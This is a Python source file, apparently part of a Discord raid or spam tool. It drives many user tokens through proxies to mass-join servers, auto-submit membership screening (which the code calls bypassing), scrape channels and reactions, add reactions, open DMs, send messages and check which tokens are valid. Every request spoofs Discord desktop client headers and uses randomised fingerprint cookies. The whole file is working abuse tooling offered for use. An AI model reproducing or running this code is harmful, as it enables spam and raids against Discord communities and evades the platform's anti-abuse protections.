from authsocket import validateChecksum
import utils
import httpx
import os
from base64 import b64encode as b
import json
import random
import string
import global_variables
from colorama import Fore, Back, Style


async def rc(len):
    return os.urandom(len).hex()[len:]


async def getInviteInfo(invite):
    try:
        async with httpx.AsyncClient(proxies=utils.getProxy()) as client:
            info = await client.get(f'https://discord.com/api/v9/invites/{invite}?with_counts=true', headers={'Authorization': 'undefined'})
            return info.json()

    except Exception as e:
        print("JOINER> Error on getting guild info", e)
        return await getInviteInfo(invite)


async def joinGuild(guildInvite, token, guildInfo):
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-GB',
        'authorization': token,
        'cookie': f'__dcfduid={await rc(43)}; __sdcfduid={await rc(96)}; __stripe_mid={await rc(18)}-{await rc(4)}-{await rc(4)}-{await rc(4)}-{await rc(18)}; locale=en-GB; __cfruid={await rc(40)}-{"".join(random.choice(string.digits) for i in range(10))}',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
        'x-context-properties': b(json.dumps({"location": "Accept Invite Page", "location_guild_id": guildInfo["guild"]["id"], "location_channel_id": guildInfo["channel"]["id"], "location_channel_type": guildInfo["channel"]["type"]}).encode()),
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAzMDE2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
    }

    try:
        async with httpx.AsyncClient(proxies=utils.getProxy(), timeout=5) as client:
            res = await client.post(f'https://discord.com/api/v9/invites/{guildInvite}', headers=headers)
            if 'new_member' in res.text:
                global_variables.joins_success += 1
                global_variables.joined_tokens.append(token)
                print(
                    f"{Fore.GREEN}JOINER> Joined '{guildInfo['guild']['name']}'{Fore.RESET} from user: {utils.getTokenId(token)}")
            else:
                print(
                    f"{Fore.RED}JOINER> Failed to join '{guildInfo['guild']['name']}'{Fore.RESET} from user: {utils.getTokenId(token)}")
                global_variables.joins_failed += 1

            if 'show_verification_form' in res.text:
                if res.json()["show_verification_form"]:
                    if 'rules' in guildInfo:
                        req = await client.put(f"https://discord.com/api/v9/guilds/{guildInfo['guild']['id']}/requests/@me", headers=headers, json=guildInfo["rules"])
                        if req.status_code == 201:
                            print(
                                f"{Fore.GREEN}JOINER> Successfully bypassed membership screening for '{guildInfo['guild']['name']}'{Fore.RESET} from user: {utils.getTokenId(token)}")

                    else:
                        req = await client.get(f"https://discord.com/api/v9/guilds/{guildInfo['guild']['id']}/member-verification?with_guild=false&invite_code={guildInvite}", headers=headers)
                        if req.status_code == 200:
                            j = req.json()
                            guildInfo["rules"] = j
                            req = await client.put(f"https://discord.com/api/v9/guilds/{guildInfo['guild']['id']}/requests/@me", headers=headers, json=j)
                            if req.status_code == 201:
                                print(
                                    f"{Fore.GREEN}JOINER> Successfully bypassed membership screening for '{guildInfo['guild']['name']}'{Fore.RESET} from user: {utils.getTokenId(token)}")

    except Exception as e:
        print(f"{Fore.RED}JOINER> Error on joining guild{Fore.RESET}", e,
              "(User ID: " + utils.getTokenId(token) + ")")

        return await joinGuild(guildInvite, token, guildInfo)


async def getGuildChannels(token, guildId):
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-GB',
        'authorization': token,
        'cookie': f'__dcfduid={await rc(43)}; __sdcfduid={await rc(96)}; __stripe_mid={await rc(18)}-{await rc(4)}-{await rc(4)}-{await rc(4)}-{await rc(18)}; locale=en-GB; __cfruid={await rc(40)}-{"".join(random.choice(string.digits) for i in range(10))}',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAzMDE2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
    }

    try:
        async with httpx.AsyncClient(proxies=utils.getProxy()) as client:
            req = await client.get(f'https://discord.com/api/v9/guilds/{guildId}/channels', headers=headers)
            j = req.json()
            channels = []

            for channel in j:
                if channel['type'] == 0:
                    channels.append(channel)

            return channels

    except Exception as e:
        print(f"{Fore.RED}SCRAPER> Error on getting guild channels{Fore.RESET}", e)
        return await getGuildChannels(token, guildId)


async def getReactions(token, channelId):
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-GB',
        'authorization': token,
        'cookie': f'__dcfduid={await rc(43)}; __sdcfduid={await rc(96)}; __stripe_mid={await rc(18)}-{await rc(4)}-{await rc(4)}-{await rc(4)}-{await rc(18)}; locale=en-GB; __cfruid={await rc(40)}-{"".join(random.choice(string.digits) for i in range(10))}',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAzMDE2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
    }

    try:
        async with httpx.AsyncClient(proxies=utils.getProxy()) as client:
            req = await client.get(f'https://discord.com/api/v9/channels/{channelId}/messages', headers=headers)
            j = req.json()
            reactions = []

            for message in j:
                if 'reactions' in message:
                    reactions.append(
                        {"message": message, "reactions": message['reactions']})

            return reactions
    except Exception as e:
        print(f"{Fore.RED}JOINER> Error on getting channel reactions{Fore.RESET}", e)
        return await getReactions(token, channelId)


async def addReaction(token, data):
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-GB',
        'authorization': token,
        'cookie': f'__dcfduid={await rc(43)}; __sdcfduid={await rc(96)}; __stripe_mid={await rc(18)}-{await rc(4)}-{await rc(4)}-{await rc(4)}-{await rc(18)}; locale=en-GB; __cfruid={await rc(40)}-{"".join(random.choice(string.digits) for i in range(10))}',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTM1NTQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
    }

    try:
        async with httpx.AsyncClient(proxies=utils.getProxy(), timeout=5) as client:
            res = await client.put(f'https://discord.com/api/v9/channels/{data["channel_id"]}/messages/{data["message_id"]}/reactions/{data["emoji"]}/%40me', headers=headers, timeout=100)
            return res
    except Exception as e:
        print(f"{Fore.RED}REACTOR> Error on adding reaction{Fore.RESET}", e)
        pass


async def getChatId(session, token, userId):
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-GB',
        'authorization': token,
        'content-type': 'application/json',
        'cookie': f'__dcfduid={await rc(43)}; __sdcfduid={await rc(96)}; __stripe_mid={await rc(18)}-{await rc(4)}-{await rc(4)}-{await rc(4)}-{await rc(18)}; locale=en-GB; __cfruid={await rc(40)}-{"".join(random.choice(string.digits) for i in range(10))}',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
        'x-context-properties': 'e30=',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAwMDU0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='
    }

    try:
        res = await session.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json={"recipients": [userId]}, timeout=100)
        return res.json()['id']
    except Exception as e:
        pass


async def sendMessage(session, token, channel, payload):
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-GB',
        'authorization': token,
        'cookie': f'__dcfduid={await rc(43)}; __sdcfduid={await rc(96)}; __stripe_mid={await rc(18)}-{await rc(4)}-{await rc(4)}-{await rc(4)}-{await rc(18)}; locale=en-GB; __cfruid={await rc(40)}-{"".join(random.choice(string.digits) for i in range(10))}',
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer': f'https://discord.com/channels/@me/{channel}',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTM1NTQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
    }

    try:
        res = await session.post(f'https://discord.com/api/v9/channels/{channel}/messages', headers=headers, json=payload, timeout=100)
        return res
    except Exception as e:
        pass

async def checkToken(token):
	headers = {
		"Authorization": token,
		"Content-Type": "application/json",
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
	}

	async with httpx.AsyncClient(proxies=utils.getProxy(), timeout=15) as client:
		res = await client.get("https://discord.com/api/v9/users/@me/library", headers=headers)

		if res.status_code == 200:
			global_variables.valid_tokens_count += 1
			global_variables.valid_tokens.append(token)
	